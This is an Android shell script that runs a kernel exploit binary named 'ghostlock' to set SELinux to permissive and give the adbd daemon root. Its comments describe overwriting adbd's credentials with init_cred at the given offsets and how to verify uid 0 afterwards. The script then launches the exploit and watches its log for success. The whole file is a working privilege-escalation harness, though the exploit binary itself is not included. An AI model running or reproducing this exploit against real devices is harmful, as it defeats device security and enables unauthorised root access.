#!/system/bin/sh
# W1 + W1c: SELinux permissive, then give *adbd* root by replacing its cred with
# init_cred (the exploit's WriteMode::Credential).  Nothing is written to our own
# process's cred, so the observable effect is just "adbd is root", which is what a
# normal "adb root"-capable device looks like.
#
#   W1c locates adbd with perf_find_task_of (GHOSTLOCK_ADBD_ROOT=1), derives
#   real_cred = comm-0x18 and cred = comm-0x10, and writes both.
#   GHOSTLOCK_W1C_ONLY makes the run stop there instead of falling through to W2/W3.
#   GHOSTLOCK_PARK_AFTER_W1 keeps the forged PI state alive (never kill that process).
#
# Verify afterwards:
#   cat /proc/$(pidof adbd)/status | grep ^Uid      -> 0 0 0 0
#   adb shell id                                    -> uid=0(root) if adbd does not
#                                                      re-drop its shells

DIR=/data/local/tmp/gl-w1
LOG="$DIR/w1c.log"

cd "$DIR" || exit 1
export GHOSTLOCK_HOME="$DIR"
export GHOSTLOCK_MCAST_SOCKET=tcp6
export GHOSTLOCK_ADBD_ROOT=1
export GHOSTLOCK_W1C_ONLY=1
export GHOSTLOCK_PARK_AFTER_W1=1

echo "W1c: before: enforce=$(getenforce) adbd_pid=$(pidof adbd)"

rm -f "$LOG"
setsid ./ghostlock --profile "$DIR/profile.bin" >"$LOG" 2>&1 &
PID=$!
echo "W1c: started pid=$PID -- log echoed below (also kept in $LOG)"

seen=0
i=0
while [ $i -lt 120 ]; do
    total=$(wc -l < "$LOG" 2>/dev/null)
    [ -z "$total" ] && total=0
    if [ "$total" -gt "$seen" ]; then
        tail -n +$((seen + 1)) "$LOG"
        seen=$total
    fi
    if grep -q "W1c-only complete" "$LOG" 2>/dev/null; then
        echo "W1c: DONE -- adbd pid=$(pidof adbd) uid=$(sed -n 's/^Uid:\t//p' /proc/$(pidof adbd)/status 2>/dev/null)"
        echo "W1c: parked process is pid=$PID; do NOT kill it (a reboot is the clean exit)"
        exit 0
    fi
    if [ "$i" -gt 5 ] && ! kill -0 "$PID" 2>/dev/null; then
        echo "W1c: process exited without completing -- last lines:"
        tail -8 "$LOG"
        exit 1
    fi
    sleep 1
    i=$((i + 1))
done

echo "W1c: still running after 120s (pid=$PID); see $LOG"
exit 2
